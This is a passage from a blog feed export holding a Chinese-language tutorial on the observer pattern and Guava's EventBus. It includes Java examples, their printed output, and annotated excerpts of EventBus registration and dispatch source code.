            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jar </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[guava-eventbus]]></title>
      <url>http://qsli.github.io/2017/01/17/guava-eventbus/</url>
      <content type="html"><![CDATA[<h2 id="从观察者模式说起"><a href="#从观察者模式说起" class="headerlink" title="从观察者模式说起"></a>从观察者模式说起</h2><h3 id="观察者模式类图"><a href="#观察者模式类图" class="headerlink" title="观察者模式类图"></a>观察者模式类图</h3><p>观察者模式是软件设计中经常使用到的一种模式，又叫发布-订阅模式（Publish/Subscribe）、模型-视图(Model/View)模式、源-监听器（Source/Listener）模式或从属者（Dependents）模式。</p>
<img src="http://www.plantuml.com/plantuml/svg/ZL1B3e8m4Dtt51FSWCe5Z36X7825I-C2w4XGqffIJOnwTm5f1IdYRlBcVMOUESVfASuGoajon5JT2O1e9jY-4QYX1N2XyiCjIagKLvIbwpLep9Y6MeHXWGfxu9DyJ4F1KraHMlDWtFo7YawezENhX-yF4YVsb5GMkXJHUdTQYJgGFc6OB2fZP-uODgp0DNCeYg8YvO9xbXyrBR0dZB2fdMqoUw-QY4a69NKTtnM2lvjb4f4lcL0AsNvZiHw8_b1HyW80">
<h3 id="Java中的支持"><a href="#Java中的支持" class="headerlink" title="Java中的支持"></a>Java中的支持</h3><p>Java中有一个<code>Observable</code>类和一个<code>Observer</code>接口, <code>Observable</code>类已经实现了添加、删除观察者的方法。</p>
<ul>
<li>主题继承自<code>Observable</code>，继承一些便利方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Subject</span> <span class="keyword">extends</span> <span class="title">Observable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String subject = <span class="string">"play with some fun"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">        notifyObservers(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSubject</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> subject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Subject subject = <span class="keyword">new</span> Subject();</span><br><span class="line">        subject.addObserver(<span class="keyword">new</span> Watcher(<span class="string">"001"</span>));</span><br><span class="line">        subject.addObserver(<span class="keyword">new</span> Watcher(<span class="string">"007"</span>));</span><br><span class="line">        subject.setChanged();</span><br><span class="line">        <span class="comment">//will do nothing until setChanged() is called</span></span><br><span class="line">        subject.push(<span class="string">"My watch is ended!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>观察者继承<code>Observer</code>接口，只有一个<code>update</code>方法用来更新数据</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Watcher</span> <span class="keyword">implements</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Watcher</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        System.out.println(<span class="string">"My watch begins! "</span> + id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(Observable o, Object arg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"-----------------------------------------------------------"</span>);</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        Subject subject = (Subject) o;</span><br><span class="line">        System.out.println(<span class="string">"subject is : "</span> + subject.getSubject());</span><br><span class="line">        System.out.println(<span class="string">"update data is : "</span> + (String)arg );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">My watch begins! 001</span><br><span class="line">My watch begins! 007</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">007</span><br><span class="line">subject is : play with some fun</span><br><span class="line">update data is : My watch is ended!</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">001</span><br><span class="line">subject is : play with some fun</span><br><span class="line">update data is : My watch is ended!</span><br></pre></td></tr></table></figure>
<h3 id="EventBus"><a href="#EventBus" class="headerlink" title="EventBus"></a>EventBus</h3><blockquote>
<p>EventBus allows publish-subscribe-style communication between components without requiring the components to explicitly register with one another (and thus be aware of each other). It is designed exclusively to replace traditional Java in-process event distribution using explicit registration. It is not a general-purpose publish-subscribe system, nor is it intended for interprocess communication.</p>
</blockquote>
<p>EventBus的优点：</p>
<ul>
<li>无需定义接口，使用注解的形式。</li>
<li>可以在一个类中实现多个事件的捕获。</li>
</ul>
<blockquote>
<p>Due to erasure, no single class can implement a generic interface more than once with different type parameters. </p>
</blockquote>
<ul>
<li>支持子类的捕获。</li>
<li>支持捕获无人处理的event（让我想起了死漂）。</li>
<li>传递的事件类型可以是任意的。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Customer</span> <span class="keyword">extends</span> <span class="title">Person</span>  <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; hobbies;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Customer</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getHobbies</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hobbies;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHobbies</span><span class="params">(List&lt;String&gt; hobbies)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.hobbies = hobbies;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义一个<code>Person</code>类和一个<code>Customer</code>类，用于测试继承关系的捕捉</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EventBusTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        EventBus eventBus = <span class="keyword">new</span> EventBus();</span><br><span class="line">        eventBus.register(<span class="keyword">new</span> EventBusChangeRecorder());</span><br><span class="line">        Customer customer = <span class="keyword">new</span> Customer(<span class="string">"customer"</span>, <span class="number">66</span>);</span><br><span class="line">        Person p = <span class="keyword">new</span> Person(<span class="string">"person"</span>, <span class="number">11</span>);</span><br><span class="line">        eventBus.post(customer);</span><br><span class="line">        eventBus.post(p);</span><br><span class="line">        eventBus.post(<span class="keyword">new</span> Integer(<span class="number">123</span>));</span><br><span class="line">        eventBus.post(<span class="string">"Hello World"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">EventBusChangeRecorder</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Subscribe</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recordCustomerChange</span><span class="params">(Customer customer)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"-----------------------------------"</span>);</span><br><span class="line">            System.out.println(<span class="string">"recieved change:"</span>);</span><br><span class="line">            System.out.println(<span class="string">"customer name: "</span> + customer.getName());</span><br><span class="line">            System.out.println(<span class="string">"cutomer age: "</span> + customer.getAge());</span><br><span class="line">            System.out.println(<span class="string">"\n\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Subscribe</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">valueChange</span><span class="params">(Integer val)</span> </span>&#123;<span class="comment">//注意方法的类型</span></span><br><span class="line">            System.out.println(<span class="string">"-----------------------------------"</span>);</span><br><span class="line">            System.out.println(<span class="string">"val = "</span> + val);</span><br><span class="line">            System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Subscribe</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deadEvent</span><span class="params">(DeadEvent deadEvent)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"-----------------------------------"</span>);</span><br><span class="line">            System.out.println(<span class="string">"deadEvent = "</span> + deadEvent);</span><br><span class="line">            System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Subscribe</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hierarchy</span><span class="params">(Person person)</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"-----------------------------------"</span>);</span><br><span class="line">            <span class="comment">//will recieve all person and it's subtype</span></span><br><span class="line">            System.out.println(person);</span><br><span class="line">            System.out.println(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在我的电脑上的执行结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">recieved change:</span><br><span class="line">customer name: customer</span><br><span class="line">cutomer age: 66</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">Person&#123;name=&apos;customer&apos;, age=66&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">Person&#123;name=&apos;person&apos;, age=11&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">val = 123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line">deadEvent = DeadEvent&#123;source=EventBus&#123;default&#125;, event=Hello World&#125;</span><br></pre></td></tr></table></figure>
<h3 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h3><h4 id="listener注册过程"><a href="#listener注册过程" class="headerlink" title="listener注册过程"></a>listener注册过程</h4><p><code>EventBus</code>中有一个成员变量叫做<code>subscribers</code>, 负责管理所有注册进来的listener</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> SubscriberRegistry subscribers = <span class="keyword">new</span> SubscriberRegistry(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure>
<p><code>register(Object object)</code>方法就是调用<code>subscribers</code>的注册方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Registers all subscriber methods on &#123;<span class="doctag">@code</span> object&#125; to receive events.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object object whose subscriber methods should be registered.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">  subscribers.register(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Registers all subscriber methods on the given listener object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register</span><span class="params">(Object listener)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//解析注解，生成&lt;EventType, ListenMethod&gt;的multimap</span></span><br><span class="line">  Multimap&lt;Class&lt;?&gt;, Subscriber&gt; listenerMethods = findAllSubscribers(listener);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Map.Entry&lt;Class&lt;?&gt;, Collection&lt;Subscriber&gt;&gt; entry : listenerMethods.asMap().entrySet()) &#123;</span><br><span class="line">    Class&lt;?&gt; eventType = entry.getKey();</span><br><span class="line">    Collection&lt;Subscriber&gt; eventMethodsInListener = entry.getValue();</span><br><span class="line"></span><br><span class="line">    CopyOnWriteArraySet&lt;Subscriber&gt; eventSubscribers = subscribers.get(eventType);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新建或者添加到已有的事件对应的Listener中</span></span><br><span class="line">    <span class="keyword">if</span> (eventSubscribers == <span class="keyword">null</span>) &#123;</span><br><span class="line">      CopyOnWriteArraySet&lt;Subscriber&gt; newSet = <span class="keyword">new</span> CopyOnWriteArraySet&lt;Subscriber&gt;();</span><br><span class="line">      eventSubscribers =</span><br><span class="line">          MoreObjects.firstNonNull(subscribers.putIfAbsent(eventType, newSet), newSet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eventSubscribers.addAll(eventMethodsInListener);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns all subscribers for the given listener grouped by the type of event they subscribe to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Multimap&lt;Class&lt;?&gt;, Subscriber&gt; findAllSubscribers(Object listener) &#123;</span><br><span class="line">  Multimap&lt;Class&lt;?&gt;, Subscriber&gt; methodsInListener = HashMultimap.create();</span><br><span class="line">  Class&lt;?&gt; clazz = listener.getClass();</span><br><span class="line">  <span class="keyword">for</span> (Method method : getAnnotatedMethods(clazz)) &#123;<span class="comment">//有缓存哦</span></span><br><span class="line">    Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();</span><br><span class="line">    Class&lt;?&gt; eventType = parameterTypes[<span class="number">0</span>];</span><br><span class="line">    methodsInListener.put(eventType, Subscriber.create(bus, listener, method));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> methodsInListener;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>subscribers</code>的注册方法中完成了对注解<code>@Subscribe</code>的解析。</p>
<h4 id="事件分发过程"><a href="#事件分发过程" class="headerlink" title="事件分发过程"></a>事件分发过程</h4><p><code>EventBus</code>的post方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Posts an event to all registered subscribers. This method will return successfully after the</span></span><br><span class="line"><span class="comment"> * event has been posted to all subscribers, and regardless of any exceptions thrown by</span></span><br><span class="line"><span class="comment"> * subscribers.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;If no subscribers have been subscribed for &#123;<span class="doctag">@code</span> event&#125;'s class, and &#123;<span class="doctag">@code</span> event&#125; is not</span></span><br><span class="line"><span class="comment"> * already a &#123;<span class="doctag">@link</span> DeadEvent&#125;, it will be wrapped in a DeadEvent and reposted.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> event event to post.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">post</span><span class="params">(Object event)</span> </span>&#123;</span><br><span class="line">  Iterator&lt;Subscriber&gt; eventSubscribers = subscribers.getSubscribers(event);</span><br><span class="line">  <span class="keyword">if</span> (eventSubscribers.hasNext()) &#123;</span><br><span class="line">    dispatcher.dispatch(event, eventSubscribers);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(event <span class="keyword">instanceof</span> DeadEvent)) &#123;</span><br><span class="line">    <span class="comment">// the event had no subscribers and was not itself a DeadEvent</span></span><br><span class="line">    post(<span class="keyword">new</span> DeadEvent(<span class="keyword">this</span>, event));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>dispatcher</code>默认是<code>Dispatcher.perThreadDispatchQueue()</code></p>
<p>它的<code>dispatch</code>方法实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Per-thread queue of events to dispatch.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ThreadLocal&lt;Queue&lt;Event&gt;&gt; queue =</span><br><span class="line">    <span class="keyword">new</span> ThreadLocal&lt;Queue&lt;Event&gt;&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">protected</span> Queue&lt;Event&gt; <span class="title">initialValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Queues.newArrayDeque();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Per-thread dispatch state, used to avoid reentrant event dispatching.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ThreadLocal&lt;Boolean&gt; dispatching =</span><br><span class="line">    <span class="keyword">new</span> ThreadLocal&lt;Boolean&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">protected</span> Boolean <span class="title">initialValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dispatch</span><span class="params">(Object event, Iterator&lt;Subscriber&gt; subscribers)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//入参校验</span></span><br><span class="line">  checkNotNull(event);</span><br><span class="line">  checkNotNull(subscribers);</span><br><span class="line">  <span class="comment">//从ThreadLocal中拿到队列</span></span><br><span class="line">  Queue&lt;Event&gt; queueForThread = queue.get();</span><br><span class="line">  <span class="comment">//先把事件入队列</span></span><br><span class="line">  queueForThread.offer(<span class="keyword">new</span> Event(event, subscribers));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dispatching.get()) &#123;</span><br><span class="line">    dispatching.set(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Event nextEvent;</span><br><span class="line">      <span class="comment">//遍历队列中的事件，并分发给相应的订阅者</span></span><br><span class="line">      <span class="keyword">while</span> ((nextEvent = queueForThread.poll()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (nextEvent.subscribers.hasNext()) &#123;</span><br><span class="line">          nextEvent.subscribers.next().dispatchEvent(nextEvent.event);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      dispatching.remove();</span><br><span class="line">      queue.remove();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>EventBus的注解提取（简单的缓存），构建相应的Map，以及事件的分发设计地非常好，有了一个大型系统完整的雏形。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://www.cnblogs.com/peida/p/EventBus.html" rel="external nofollow noopener noreferrer" target="_blank">Guava学习笔记：EventBus - peida - 博客园</a></p>
</li>
<li><p><a href="https://github.com/google/guava/wiki/EventBusExplained" rel="external nofollow noopener noreferrer" target="_blank">EventBusExplained · google/guava Wiki</a></p>
</li>
<li><p><a href="https://zh.wikipedia.org/wiki/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F" rel="external nofollow noopener noreferrer" target="_blank">观察者模式 - 维基百科，自由的百科全书</a></p>
</li>
